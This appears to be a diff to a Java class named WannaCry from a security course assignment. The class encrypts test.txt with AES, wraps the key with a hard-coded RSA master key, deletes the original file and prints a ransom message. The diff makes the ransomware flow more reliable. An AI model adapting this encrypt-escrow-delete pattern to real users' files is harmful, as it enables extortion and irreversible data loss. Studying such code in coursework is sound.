@@ -7,6 +7,7 @@ import java.util.Base64;
 
 public class WannaCry {
     // Master RSA public key (Base64 encoded) - provided by assignment
+    // This must match exactly - any character difference will break decryption
     private static final String MASTER_PUBLIC_KEY_B64 = 
         "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpP" +
         "qoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXd" +
@@ -34,20 +35,24 @@ public class WannaCry {
             Cipher aesCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
             aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, ivSpec);
             
-            // 3. Read, encrypt, write
+            // 3. Read and encrypt file
             byte[] plaintext = Files.readAllBytes(inputFile);
             byte[] ciphertext = aesCipher.doFinal(plaintext);
-            Files.write(Paths.get("test.txt.cry"), ciphertext);
             
-            // 4. Delete original
-            Files.delete(inputFile);
-            
-            // 5. Encrypt AES key with RSA master public key
+            // 4. Encrypt AES key with RSA master public key
+            // Use explicit padding for cross-platform consistency
             PublicKey masterPublicKey = loadMasterPublicKey();
-            Cipher rsaCipher = Cipher.getInstance("RSA");
+            Cipher rsaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
             rsaCipher.init(Cipher.ENCRYPT_MODE, masterPublicKey);
             byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());
+            
+            // 5. Write encrypted files BEFORE deleting original
+            // This ensures we don't lose data if something fails
+            Files.write(Paths.get("test.txt.cry"), ciphertext);
             Files.write(Paths.get("aes.key"), encryptedAesKey);
+            
+            // 6. Delete original only after both files written successfully
+            Files.delete(inputFile);
             
             // Display ransom message
             System.out.println();
